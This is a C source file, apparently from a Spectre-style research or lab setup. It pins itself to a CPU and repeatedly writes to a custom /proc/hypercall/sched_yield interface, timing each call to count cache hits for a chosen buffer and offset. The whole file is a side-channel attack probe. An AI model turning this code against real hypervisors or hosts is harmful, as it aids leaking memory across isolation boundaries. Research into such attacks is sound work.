#define _GNU_SOURCE
#include <err.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sched.h>
#include <assert.h>
#include "constants.h"
#include "spectre.h"

static int half_spectre_raw(void *buf, const size_t idx, const size_t iters) {
	static int fd_sched_yield = -1;
	if (fd_sched_yield == -1) {
		fd_sched_yield = open ("/proc/hypercall/sched_yield", O_WRONLY);
		assert(fd_sched_yield > 0);
	}

	static struct sched_yield_hypercall opts = {
		.current_cpu_id = -1,
		.speculated_cpu_id = -1,
		.ptr = NULL
	};
	if (opts.current_cpu_id == -1ULL) {
		// Get current cpu.
		unsigned int cpu = 0;
		if (getcpu(&cpu, NULL) == -1) {
			err(EXIT_FAILURE, "Failed to get CPU");
		}

		// Pin ourselves to that cpu.
		cpu_set_t s;
		CPU_ZERO(&s);
		CPU_SET(cpu, &s);
		sched_setaffinity(0, sizeof(cpu_set_t), &s);

		// Save it.
		opts.current_cpu_id = cpu;
	}

	opts.speculated_cpu_id = idx;
	opts.ptr = buf;

	int hits = 0;
	for (size_t i = 0; i < iters; ++i) {
		ssize_t time = write(fd_sched_yield, &opts, sizeof(opts));
		assert(time >= 0);
		if (time < CACHE_HIT_THRESHOLD) {
			hits++;
		}
	}

	return hits;
}

void half_spectre(unsigned char *p, uintptr_t pa_p, uintptr_t pa_base)
{
	for (int delta_p = 0; delta_p <= 0x200; delta_p += 0x200) {
		for (int delta_off = 0; delta_off <= 0x200; delta_off += 0x200) {
			uint64_t off = pa_p - pa_base + delta_off;
			printf("half_spectre | pa_base = %lx | p's pa = %lx | offset = %lx | idx = %lx ", pa_base, pa_p+delta_p, off, off/8);
			printf("| hits = %d / 10M\n", half_spectre_raw(p + delta_p, off/8, 10000000));
		}
	}
}
